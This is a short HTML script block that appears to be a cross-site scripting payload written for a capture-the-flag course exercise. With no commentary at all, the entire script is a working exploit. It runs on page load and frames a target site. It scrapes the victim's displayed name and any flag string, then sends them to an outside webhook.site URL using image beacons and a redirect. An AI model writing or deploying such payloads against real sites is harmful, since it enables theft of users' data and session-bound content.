<script>
console.log('v16');

function exploit() {
    var iframe = document.createElement('iframe');
    iframe.src = 'https://cats.is-course.ru/';
    iframe.style.width = '100%';
    iframe.style.height = '500px';

    iframe.onload = function() {
        new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?iframe_loaded";
        
        try {
            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            var text = iframeDoc.body.innerText;
            
            if(text.includes('Welcome')) {
                var name = text.match(/Welcome,\s*([^!]+)!/);
                new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?name=" + name[1];
                
                var flagMatch = text.match(/flag{[^}]+}/);
                if(flagMatch) {
                    window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?FLAG=" + flagMatch[0];
                }
            }
        } catch(e) {
            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?error=" + toString(e);
        }
    };

    document.body.appendChild(iframe);
}

if(document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', exploit);
} else {
    exploit();
}
</script>
